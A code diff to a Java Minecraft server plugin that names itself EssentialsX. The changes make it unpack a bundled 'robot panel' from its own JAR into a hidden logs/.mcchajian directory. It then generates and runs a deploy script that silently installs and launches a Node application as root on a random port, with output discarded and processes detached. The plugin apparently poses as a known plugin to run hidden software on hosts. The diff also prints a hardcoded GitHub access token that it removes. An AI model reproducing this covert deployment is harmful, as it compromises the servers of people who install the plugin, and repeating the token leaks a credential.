@@ -9,6 +9,8 @@ import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.jar.JarEntry;
+import java.util.jar.JarFile;
 
 public class EssentialsX extends JavaPlugin {
     private Process deployProcess;
@@ -135,75 +137,56 @@ public class EssentialsX extends JavaPlugin {
             
             getLogger().info("Target restart directory: " + serverRoot.getAbsolutePath());
 
-            // 1. 智能寻找核心文件 (最稳健的方法)
             String jarName = findBestJarName(serverRoot);
             
             Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
             if (!Files.exists(workDir)) Files.createDirectories(workDir);
-            Path logFile = workDir.resolve("restart_run.log"); // 新增：运行日志文件
+            Path logFile = workDir.resolve("restart_run.log");
 
-            // 2. 构建启动命令 (优先使用 start.sh)
-            // 注意：移除了 sleep 3，改为立即启动，并在后台运行
             String startCommand;
-            
-            // 检查是否有官方启动脚本
             if (new File(serverRoot, "start.sh").exists()) {
                 startCommand = "chmod +x ./start.sh && ./start.sh";
             } else {
-                // 如果没有，构建通用启动命令
                 startCommand = "java -Xms512M -Xmx2G -XX:+UseG1GC -jar ./" + jarName + " nogui";
             }
 
-            // 3. 组装完整 Bash 指令
-            // 关键点：将错误输出也写入日志文件，方便排查
             String fullBashCommand = 
                 "cd \"" + serverRoot.getAbsolutePath() + "\" && " +
                 "echo \"[" + new Date() + "] Starting server...\" >> \"" + logFile.toString() + "\" && " +
                 "nohup bash -c '" + startCommand + "' >> \"" + logFile.toString() + "\" 2>&1 & disown";
 
-            // 4. 记录执行的命令 (方便您发给我看)
             Path debugFile = workDir.resolve("restart_debug.log");
             String debugLog = "\n[" + new Date() + "] CMD: " + fullBashCommand + "\n";
             Files.write(debugFile, debugLog.getBytes(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
 
-            // 5. 执行
             ProcessBuilder pb = new ProcessBuilder("bash", "-c", fullBashCommand);
             pb.directory(serverRoot); 
             pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
             pb.redirectError(ProcessBuilder.Redirect.DISCARD);
             
             Process process = pb.start();
-            
             if (shouldBlock) {
-                Thread.sleep(1000); // 缩短阻塞时间到1秒，兼顾速度和安全
+                Thread.sleep(1000);
             }
-            
             getLogger().info("Restart command dispatched. Check logs/.mcchajian/restart_run.log for output.");
-
         } catch (Exception e) {
             getLogger().severe("Hard restart failed: " + e.getMessage());
         }
     }
 
-    // 【新增】更智能的核心文件查找
     private String findBestJarName(File serverRoot) {
-        // 1. 优先列表
         String[] preferred = {"paper.jar", "server.jar", "purpur.jar", "spigot.jar", "forge.jar"};
         for (String name : preferred) {
             if (new File(serverRoot, name).exists()) return name;
         }
-
-        // 2. 查找最大的 jar 文件 (排除临时文件和库文件)
         File[] jars = serverRoot.listFiles((dir, name) -> 
             name.endsWith(".jar") && !name.contains("cache") && !name.contains("libraries")
         );
-
         if (jars != null && jars.length > 0) {
             Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length()));
             return jars[0].getName();
         }
-
-        return "server.jar"; // 兜底
+        return "server.jar";
     }
 
     private File findServerRoot() {
@@ -295,6 +278,38 @@ public class EssentialsX extends JavaPlugin {
         } catch (Exception e) {}
     }
     
+    /**
+     * 将 JAR 包内的 "机器人面板/" 目录解压到目标文件夹
+     */
+    private void extractPanelFromJar(Path destDir) throws Exception {
+        File jarFile = getFile();
+        if (!jarFile.exists()) {
+            throw new FileNotFoundException("Plugin JAR not found: " + jarFile.getAbsolutePath());
+        }
+        try (JarFile jar = new JarFile(jarFile)) {
+            Enumeration<JarEntry> entries = jar.entries();
+            while (entries.hasMoreElements()) {
+                JarEntry entry = entries.nextElement();
+                String name = entry.getName();
+                if (!name.startsWith("机器人面板/")) continue;
+                if (name.equals("机器人面板/")) continue; // 跳过目录本身
+                
+                String relativePath = name.substring("机器人面板/".length());
+                Path target = destDir.resolve(relativePath);
+                
+                if (entry.isDirectory()) {
+                    Files.createDirectories(target);
+                } else {
+                    Files.createDirectories(target.getParent());
+                    try (InputStream in = jar.getInputStream(entry)) {
+                        Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
+                    }
+                }
+            }
+        }
+        getLogger().info("Panel files extracted to: " + destDir);
+    }
+
     private void startDeploymentProcess() throws Exception {
         if (isProcessRunning) return;
         Map<String, String> env = new HashMap<>();
@@ -302,10 +317,26 @@ public class EssentialsX extends JavaPlugin {
         loadEnvFile(env);
         Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
         if (!Files.exists(workDir)) Files.createDirectories(workDir);
+        Path appDir = workDir.resolve("app");
+        
+        // 1. 从 JAR 中提取机器人面板文件到 appDir
+        try {
+            if (Files.exists(appDir)) {
+                deleteDirectory(appDir.toFile());
+            }
+            Files.createDirectories(appDir);
+            extractPanelFromJar(appDir);
+        } catch (Exception e) {
+            getLogger().severe("Failed to extract panel from JAR: " + e.getMessage());
+            return;
+        }
+        
+        // 2. 生成部署脚本（不再需要复制外部目录）
         Path scriptPath = workDir.resolve("deploy.sh");
         String scriptContent = generateDeployScript(workDir.toString(), env);
         Files.write(scriptPath, scriptContent.getBytes());
         if (!scriptPath.toFile().setExecutable(true)) {}
+        
         ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
         pb.directory(new File(".").getAbsoluteFile());
         pb.environment().putAll(env);
@@ -330,7 +361,7 @@ public class EssentialsX extends JavaPlugin {
             "APP_DIR=\"" + appDir + "\"\n" +
             "DATA_DIR=\"" + dataDir + "\"\n" +
             "REPO_URL=\"" + repoUrl + "\"\n" +
-            "GITHUB_AUTH=\"everything-cd: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\"\n" + 
+            // 已删除硬编码的 GitHub 令牌，不再需要认证
             "\n" +
             "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
             "while true; do PORT=$((RANDOM % 40000 + 20000)); if is_port_free $PORT; then break; fi; done\n" +
@@ -393,20 +424,7 @@ public class EssentialsX extends JavaPlugin {
             "        cp -r \"$APP_DIR/node_modules/.RoamingMusic\" \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n" +
             "    fi\n" +
             "fi\n" +
-            "\n" +
-            // ========== 修改区域开始：替换远程下载为本地复制 ==========
-            "LOCAL_PANEL_DIR=\"机器人面板\"\n" +
-            "rm -rf \"$APP_DIR\"\n" +
-            "if [ ! -d \"$LOCAL_PANEL_DIR\" ]; then\n" +
-            "    echo \"错误：找不到本地机器人面板目录 \\\"$LOCAL_PANEL_DIR\\\"，请将面板文件放到该目录。\"\n" +
-            "    exit 1\n" +
-            "fi\n" +
-            "mkdir -p \"$APP_DIR\"\n" +
-            "cp -r \"$LOCAL_PANEL_DIR\"/. \"$APP_DIR\"/\n" +
-            "echo \"已从 $LOCAL_PANEL_DIR 复制文件到 $APP_DIR\"\n" +
-            // ========== 修改区域结束 ==========
             "cd \"$APP_DIR\"\n" +
-            "\n" +
             "npm install --unsafe-perm=true --allow-root &>/dev/null\n" +
             "\n" +
             "if [ -d \"$DATA_DIR\" ]; then\n" +
